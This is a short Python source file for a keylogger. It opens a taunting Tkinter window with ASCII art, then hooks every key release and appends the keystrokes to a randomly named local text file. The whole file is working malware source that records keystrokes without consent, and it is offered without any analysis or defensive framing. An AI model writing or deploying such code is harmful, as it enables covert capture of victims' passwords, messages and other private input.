import sys, tkinter, keyboard
from datetime import datetime
from string import ascii_lowercase
from random import choices

#C:\Users\alessandro.030108\AppData\Local\Programs\Python\Python311

def create_window(title, dimensions, text):
    new_window = tkinter.Tk(className=f"{title}")
    window_text_def = tkinter.Text(new_window, wrap="word", font=('Courier 15 bold'), bg="black", fg="limegreen")
    new_window.geometry(f"{dimensions}")
    window_text_def.insert(tkinter.END, f"{text}")
    window_text_def.place(x=10, y= 10, width= 475, height= 175)
    tkinter.mainloop()

class get_keyboard_input:
    def __init__(self):
        self.log = ""
        self.start_time = datetime.now()
        self.end_time = datetime.now()
        self.log_name = "".join(choices(ascii_lowercase, k=5))

    def format_input(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "

            elif name == "enter":
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
        self.write_to_file(name)


    def write_to_file(self, input):
        if len(input) >= 1:
            write_file(input, self.log_name)

        self.log = ""

    def start(self):
        self.start_time = datetime.now()

        write_file(f"{datetime.now()} - Started logging", self.log_name)

        keyboard.on_release(callback=self.format_input)
        keyboard.wait()

def write_file(input, filename):
    with open(f'{filename}.txt', 'a') as f:
        f.write(input+"\n")


def main():
    create_window("You fucked up good bro...", "500x200", "\n              ..----.._    _\n            .' .--.    '-.(O)_\n'-.__.-'''=:|  ,  _)_ \__ . c\'-..\n             ''------'---''---'-'\n")
    bah = get_keyboard_input()
    bah.start()

if __name__ == "__main__":
    main()

